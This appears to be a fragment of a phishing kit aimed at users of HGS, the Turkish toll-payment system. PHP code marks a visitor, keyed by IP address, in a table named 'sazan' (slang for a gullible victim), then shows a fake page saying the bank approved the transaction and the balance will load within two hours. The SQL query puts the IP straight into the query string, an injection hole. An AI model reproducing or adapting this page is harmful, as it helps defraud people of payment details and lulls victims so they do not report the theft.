<?php
    ...
    if($rowData->rowCount() > 0) {
        $db->query("UPDATE sazan SET now = 'Tebrik' WHERE ip = '{$ip}'");
    }
...
<title>HGS Başarılı İşlem</title>
                                ...
                                <div class="row">
                                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                       ...
                                       <div style="background:#fcfcfc;width:100%;min-height:140px;border-radius:5px;padding-top:7px;padding-bottom:7px;border:1px solid #eee;display:flex;flex-direction:column;gap:0px;align-items:center;justify-content:center;text-align:center">
                                        <img src="god/tebrik.png" width="60px;"><br>
                                            <b style="color:#666;">Tebrikler! İşlem Başarılı</b>
                                            <p>İşleminiz banka tarafından onaylandı.<br>Bakiyeniz 2 saat içerisinde yüklenecektir.</p>
                                        </div>
                                        </div>
